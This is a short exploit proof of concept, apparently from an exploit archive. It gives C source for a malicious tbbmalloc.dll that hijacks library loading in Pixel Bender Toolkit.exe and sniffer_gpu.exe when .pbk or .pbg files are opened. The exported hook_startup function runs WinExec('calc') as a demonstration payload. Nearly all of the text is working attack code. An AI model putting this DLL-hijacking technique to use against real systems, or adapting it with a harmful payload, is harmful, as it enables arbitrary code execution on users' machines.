---------------------------------------------------------
# Vulnerable: Pixel Bender Toolkit.exe & sniffer_gpu.exe
---------------------------------------------------------
# Vulnerable extensions: .pbk & .pbg
---------------------------------------------------------
# Vulnerable Dll: tbbmalloc.dll
---------------------------------------------------------
#include <windows.h>
#define DllExport __declspec (dllexport)

DllExport void hook_startup() { exp(); }

int exp()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}

